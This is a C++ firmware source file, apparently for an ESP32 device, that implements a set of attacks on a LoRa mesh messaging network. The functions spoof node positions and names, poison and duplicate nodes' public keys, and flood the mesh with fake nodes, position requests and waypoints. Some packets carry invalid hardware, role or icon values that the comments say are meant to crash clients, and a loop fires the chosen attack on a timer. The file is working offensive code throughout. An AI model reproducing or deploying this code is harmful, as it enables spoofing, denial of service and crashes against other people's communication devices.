#include "TMAttack.hpp"
#include "esp_log.h"
#include <iterator>

extern void sendDebugMessage(const std::string& message);

uint32_t TMAttack::getRandomTarget() {
    auto ret = mtCompact->nodeinfo_db.getRandomNode();
    if (ret) {
        return ret->node_id;
    }
    return 0;
}

void TMAttack::atkRndPos() {
    // Generate random latitude and longitude within specified bounds
    double latitude = min_lat + static_cast<double>(rand()) / (static_cast<double>(RAND_MAX / (max_lat - min_lat)));
    double longitude = min_lon + static_cast<double>(rand()) / (static_cast<double>(RAND_MAX / (max_lon - min_lon)));

    // Create and send the fake position message
    MCT_Position pos_msg = {};
    pos_msg.latitude_i = static_cast<int32_t>(latitude * 1e7);
    pos_msg.longitude_i = static_cast<int32_t>(longitude * 1e7);
    pos_msg.altitude = esp_random() % 1000;  // Random altitude
    pos_msg.ground_speed = 0;
    pos_msg.sats_in_view = 0;
    pos_msg.location_source = 1;
    pos_msg.has_latitude_i = true;
    pos_msg.has_longitude_i = true;
    pos_msg.has_altitude = true;
    pos_msg.has_ground_speed = true;
    uint32_t srcnode = target;
    if (target == 0xffffffff) {  // if target is everybody, randomize srcnode
        srcnode = getRandomTarget();
        if (srcnode == 0) {
            sendDebugMessage("No valid target found for position poison attack.");
            return;  // no valid target found
        }
    }
    sendDebugMessage("Sending fake position for node 0x" + std::to_string(srcnode) + ": lat=" + std::to_string(latitude) + ", lon=" + std::to_string(longitude));
    mtCompact->sendPositionMessage(pos_msg, 0xffffffff, 8, srcnode);
    mtCompact->sendPositionMessage(pos_msg, 0xffffffff, 8, srcnode);
}

void TMAttack::atkNameChange() {
    uint32_t srcnode = target;
    if (target == 0xffffffff) {  // if target is everybody, randomize srcnode
        srcnode = getRandomTarget();
        if (srcnode == 0) {
            sendDebugMessage("No valid target found for name change attack.");
            return;  // no valid target found
        }
    }
    auto node = mtCompact->nodeinfo_db.get(srcnode);
    if (!node) {
        sendDebugMessage("No valid target found for name change attack.");
        return;  // no valid target found
    }

    std::string new_name = node->long_name;
    if (new_name.size() >= emoji.size() && new_name.compare(new_name.size() - emoji.size(), emoji.size(), emoji) == 0) {
        ;  // it already got that part, so no further rename, but send a new nodeinfo packet about it.
    } else {
        if (emoji.length() <= 0) {
            emoji = "😈";
        }
        if (emoji.length() > 30) {
            emoji = emoji.substr(0, 30);  // limit to 30 bytes
        }
        if (new_name.length() + emoji.length() > 38) {
            new_name = new_name.substr(0, 38 - emoji.length());
        }
        new_name += emoji;
        strncpy(node->long_name, new_name.c_str(), 39);
    }
    node->long_name[39] = '\0';
    mtCompact->sendNodeInfo(*node, 0xffffffff, false);
    mtCompact->sendNodeInfo(*node, 0xffffffff, false);
    sendDebugMessage("Changed longname of node 0x" + std::to_string(srcnode) + " to \"" + node->long_name + "\"");
}

void TMAttack::atkDdos() {
    uint32_t srcnode = esp_random();
    mtCompact->sendRequestPositionInfo(0xffffffff, 8, srcnode);
    sendDebugMessage("Sent DDOS msg 1 request from 0x" + std::to_string(srcnode));
    srcnode = getRandomTarget();
    if (srcnode == 0) {
        sendDebugMessage("No valid target found for DDOS 2 attack.");
        return;  // no valid target found
    }
    MCT_NodeInfo* node = mtCompact->nodeinfo_db.get(srcnode);
    if (!node) {
        sendDebugMessage("No valid target found for DDOS 2 attack.");
        return;  // no valid target found
    }
    mtCompact->sendNodeInfo(*node, 0xffffffff, true);
    sendDebugMessage("Sent DDOS msg 2 from 0x" + std::to_string(srcnode));
}

void TMAttack::atkPkiPoison() {
    uint32_t srcnode = target;
    if (target == 0xffffffff) {  // if target is everybody, randomize srcnode
        srcnode = getRandomTarget();
        if (srcnode == 0) {
            sendDebugMessage("No valid target found for PKI poison attack.");
            return;  // no valid target found
        }
    }
    auto node = mtCompact->nodeinfo_db.get(srcnode);
    if (!node) {
        sendDebugMessage("No valid target found for PKI poison attack.");
        return;  // no valid target found
    }
    for (int i = 0; i < 32; i++) {
        node->public_key[i] = esp_random() & 0xff;
    }
    mtCompact->sendNodeInfo(*node, 0xffffffff, false);
    mtCompact->sendNodeInfo(*node, 0xffffffff, false);
    sendDebugMessage("Sent PKI poison for node 0x" + std::to_string(srcnode));
}

void TMAttack::atkPkiDupe() {
    uint32_t srcnode = target;
    if (target == 0xffffffff) {  // if target is everybody, randomize srcnode
        srcnode = getRandomTarget();
        if (srcnode == 0) {
            sendDebugMessage("No valid target found for PKI duplication attack.");
            return;  // no valid target found
        }
    }
    auto node = mtCompact->nodeinfo_db.get(srcnode);
    if (!node) {
        sendDebugMessage("No valid target found for PKI duplication attack.");
        return;  // no valid target found
    }
    uint32_t dupenodeid = esp_random();
    MCT_NodeInfo nodeinfo = {};  // new node
    std::string none = "";
    std::string none2 = "";
    uint8_t hw_model = esp_random() % 105;
    MtCompactHelpers::NodeInfoBuilder(&nodeinfo, dupenodeid, none, none2, hw_model);
    for (int i = 0; i < 32; i++) {
        nodeinfo.public_key[i] = node->public_key[i];  // dupe target key
    }
    nodeinfo.public_key_size = 32;
    mtCompact->sendNodeInfo(nodeinfo, 0xffffffff, false);
    mtCompact->sendNodeInfo(nodeinfo, 0xffffffff, false);
    sendDebugMessage("Sent PKI dupe as node 0x" + std::to_string(srcnode));
}

void TMAttack::atkRndNode() {
    // Generate random latitude and longitude within specified bounds
    double latitude = min_lat + static_cast<double>(rand()) / (static_cast<double>(RAND_MAX / (max_lat - min_lat)));
    double longitude = min_lon + static_cast<double>(rand()) / (static_cast<double>(RAND_MAX / (max_lon - min_lon)));

    // Create and send the fake position message
    MCT_Position pos_msg = {};
    pos_msg.latitude_i = static_cast<int32_t>(latitude * 1e7);
    pos_msg.longitude_i = static_cast<int32_t>(longitude * 1e7);
    pos_msg.altitude = esp_random() % 1000;  // Random altitude
    pos_msg.ground_speed = 0;
    pos_msg.sats_in_view = 0;
    pos_msg.location_source = 1;
    pos_msg.has_latitude_i = true;
    pos_msg.has_longitude_i = true;
    pos_msg.has_altitude = true;
    pos_msg.has_ground_speed = true;
    uint32_t srcnode = target;
    if (target == 0xffffffff) {
        srcnode = esp_random();
    }
    MCT_NodeInfo nodeinfo = {};
    std::string none = "";
    std::string none2 = "";
    uint8_t hw_model = esp_random() % 105;
    if (flood_clientcrash == 1) {
        hw_model = 240;  // invalid hw model to crash the client
    }
    MtCompactHelpers::NodeInfoBuilder(&nodeinfo, srcnode, none, none2, hw_model);
    if (flood_clientcrash == 1) {
        nodeinfo.role = 20;  // invalid role to crash the client
    }
    mtCompact->sendNodeInfo(nodeinfo, 0xffffffff, false);
    mtCompact->sendPositionMessage(pos_msg, 0xffffffff, 8, srcnode);
    mtCompact->sendNodeInfo(nodeinfo, 0xffffffff, false);
    mtCompact->sendPositionMessage(pos_msg, 0xffffffff, 8, srcnode);
    sendDebugMessage("Sent fake node 0x" + std::to_string(srcnode) + ": lat=" + std::to_string(latitude) + ", lon=" + std::to_string(longitude));
}

void TMAttack::atkWaypointFlood() {
    uint32_t srcnode = target;
    if (srcnode == 0xffffffff) {
        srcnode = getRandomTarget();
    }
    if (srcnode == 0) {
        srcnode = esp_random();
    }
    MCT_Waypoint waypoint = {};
    uint32_t icon = 0;
    if (flood_clientcrash == 1) {
        icon = esp_random() + 30;  // invalid icon to crash the client
    }
    uint32_t expire = 1769994122;  // 2026-02-02, todo add as a parameter
    float latitude = min_lat + static_cast<double>(rand()) / (static_cast<double>(RAND_MAX / (max_lat - min_lat)));
    float longitude = min_lon + static_cast<double>(rand()) / (static_cast<double>(RAND_MAX / (max_lon - min_lon)));
    uint32_t wpnum = esp_random();
    MtCompactHelpers::WaypointBuilder(waypoint, esp_random(), latitude, longitude, "WP-" + std::to_string(wpnum), "WP-" + std::to_string(wpnum), expire, icon);
    mtCompact->sendWaypointMessage(waypoint, 0xffffffff, 8, srcnode);
    sendDebugMessage("Sent waypoint from node 0x" + std::to_string(srcnode) + ": lat=" + std::to_string(latitude) + ", lon=" + std::to_string(longitude));
}

void TMAttack::loop() {
    if (mtCompact == nullptr) {
        return;  // Radio not set
    }
    if (current_attack == AttackType::NONE) {
        return;  // No attack to perform
    }
    timer++;
    if (timer < attackDelay) {  // every 10 seconds
        return;
    }
    timer = 0;
    if (current_attack == AttackType::POS_POISON) {
        atkRndPos();
    } else if (current_attack == AttackType::NODE_FLOOD) {
        atkRndNode();
    } else if (current_attack == AttackType::NAME_CHANGE) {
        atkNameChange();
    } else if (current_attack == AttackType::PKI_POISON) {
        atkPkiPoison();
    } else if (current_attack == AttackType::DDOS) {
        atkDdos();
    } else if (current_attack == AttackType::PKI_DUPE) {
        atkPkiDupe();
    } else if (current_attack == AttackType::WAYPOINT_FLOOD) {
        atkWaypointFlood();
    }
}